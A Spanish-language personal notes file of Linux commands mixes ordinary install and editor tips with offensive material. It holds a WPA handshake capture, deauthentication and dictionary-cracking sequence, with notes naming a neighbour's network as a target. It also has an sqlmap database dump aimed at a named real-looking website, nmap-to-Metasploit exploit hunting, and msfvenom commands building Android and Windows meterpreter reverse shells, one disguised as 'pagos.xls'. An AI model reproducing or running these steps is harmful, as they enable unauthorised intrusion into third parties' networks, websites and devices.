# linux
Comandos generales de Linux

Actualizacion del sistema operativo
sudo apt-get update && sudo apt-get upgrade

# Instalacion de git
sudo apt-get install git

Para el comando NANO
ctrl + O => para poder guardar

ctrl + s => guardar informacion

ctrl + w => Buscar texto en particular

ctrl + x => para salir

alt + a y flechas para marcar texto, desmarcar alt + a

copiar crtl + shift + c 
pegar crtl + shift + v


Htop

# Para control de datos de la red
aptitude search nethogs
sudo apt install nethogs
nethogs


Discos en Linux

sda
sdb
sd0 o sr0



sensible-browser




sudo airmon-ng

airmon-ng start wlan0

airodump-ng wlan0

airodump-ng --bssid 1C:B0:44:BF:33:45 --channel 11 wlan0


ifconfig

ping 192.168.1.91

nmap -sP 192.168.1.0/24 => es desde 0/24.
Con eso saco las IP conectadas a la red

nmap -sT -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sS -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sT (IP)

nmap -O (IP)

nmap -A (IP)

nmap -p- -sV (IP)
Se escanean los 65.535 puertos.
Con esto obtengo las debilidades que son posible de explotar

searchsploit (se pega el programa obtenido en el paso anterior)
se busca si tiene algun backdoor con metaexploit

nmap --script vuln IP


ip iphone 192.168.1.83




min 10:00 Nmap tutorial to find networks vulnerabilities

man ls => Ayuda del comando
ls -l -a
pwd
cd /
uname -i
cd
ls --file-type
ls --file-type -a -l

Para abir archivos
cat,less XXXXX.XXX

Para seleccionar la impresion d euna linea segun string d euna linea se ocupa grep, ej: ifconfig | grep broadcast
Para seleccionar una posicion de esa linea se utiliza awk {print$2}
Para crear alias ipaddress="ifconfig | grep broadcast | awk '{print $2}'"
alias ipaddress="echo $(ifconfig | grep broadcast | awk '{print $2}')"

# Control de procesos
ps aux | more
ps aux
En vivo = top
Instalando TOP
sudo apt-get install htop
ejecutar htop



# Airmon
iwconfig => Mode:Managed, esto debe ser cambiado a modo monitor
la tarjeta debe estar en estado monitor
ifconfig wlan0
ifconfig wlan0 down => para dejar la tarjeta en modo monitor
airmon-ng check kill => congela todos los proceso de la tarjeta
airmon-ng start wlan0 => para comenzar el proceso, en modo monitor
iwconfig => confirmar que la tarjeta este en monitor mode
el adaptador debe soportar el modo de monitor
en monitor mode
airodump-ng wlan0 => Monitoreo de redes
airodump-ng -c1 -w capture -d BSSID wlan0 => the objective is knock station (access point) and achive the handshacke
guardando esta informacion en el archivo capture.cap
En segundo terminal colocar la siguiente linea
aireplay-ng --deauth 0 -a BSSID -c STATION wlan0 => Para hacer el handshake
Saldra PMKID found
Despues WPA Handshake

ls
el archivo mas importante es capture.cap
wireshark nombre archivo
filtrar por eapol

airmon-ng stop wlan0
iwconfig
Para aplicar al dictionary
aircrack-ng capture-01.cap -w /usr/share/dict/wordlist-probable.txt
Probar con rockyou.txt, que se encuentra en /usr/share/wordlists/
Antes se debe descomprimir con gzip -d rockyou.txt.gz

Atacando al 810 =>7C:DB:98:E2:95:FC CH1
Atacando a la vecina => 18:70:3B:E6:FF:53 CH7
airodump-ng wlan0 => para rescatar BSSID y chanel

# Instalar screenfetch
sudo apt-get install screenfetch
screenfetch

# Instalar Python
https://www.python.org/downloads/source/
Donwload Linux, Gzipped.
Una vez bajado, extraer.
Dentro de la carpeta Python "./configure"
Despues script "make"
Despues script "make install"

# Instalar ATOM
Bajar: https://atom.io/ .deb
dpkg -i atom-amd64(1).deb
sudo apt --fix-broken install
sudo apt install -f

# Instalar GIT
apt install git
una vez instalado se puede ocupar "git clone URL", para bajar cualquier repositorio


# Configure bash alieses
nano -/.bash_aliases
open nano
alias hackwifi='besside-ng wlan0'
Ctrl + S
Y
enter
hackwifi

Para actualizar el paquete de instalacion
sudo apt install


# Para saber la arquitectura de un Linux
uname –m\
x86_64 = > es el correcto, 64 bits\
If the response is i686, you have a 32-bit version of Linux.\
If the response is x86_64, you have a 64-bit version of Linux.\
uname –a\
You can find out more detail about your particular installation of Linux, like your kernel version, by entering\
Se debe instalar Kali Linux para 64 bits\

Linux kali 5.9.0-kali1-686-pae #1 SMP Debian 5.9.1-1kali2 (2020-10-29) i686 GNU/Linux\
i686\


# SQLMAP
└─$  sqlmap -u https://www.realfitness.cl/detalle-producto.php?id=2 --dbs                                         127 ⨯ 3 ⚙

https://www.creadpag.com/2018/05/inyeccion-sql-en-kali-linux-usando.html
http://achap.cl/festival_2017/ganadores_categoria.php?id=4



## Uso de Nano Bash

Para comenzar un archivo @nano XXXX.sh\
Para ejecturar el archivo @bash XXXX.sh\
Para editar un archivo se ocupa el editor de texto nano\
Para guardar el archivo se aprieta Ctrl + X, despues Yes\
Para declarar una variable en un string puede ser con read o anteponiendo el signo $



# Payload para Android

https://spyboy.blog/2020/11/08/how-hackers-remotely-hack-android-using-payload/

https://hackingtoots.wordpress.com/2020/05/12/how-to-make-android-payload-using-msfvenom/

https://codepre.com/quick-guide-how-to-hack-android-with-kali-linux.html

https://spyboy.blog/2020/05/29/how-hackers-hack-android-using-metasploit-over-lan-wan/

https://spyboy.blog/2020/11/08/how-hackers-remotely-hack-android-using-payload/

https://www.androidgigs.com/how-to-hack-android-phone-remotely/

https://www.androidgigs.com/how-to-hack-android-phone-remotely/

## Instalando el metasploit
sudo apt-get install metasploit-framework
msfvenom -h
gem install bundle
bundle install
gem update --system
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o payloadname.apk  => Creando el payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o pagos.xls => otro payload

## En otra consola
msfconsole => Se corre en otra consola
use exploit/multi/handler
set LHOST 192.168.1.91


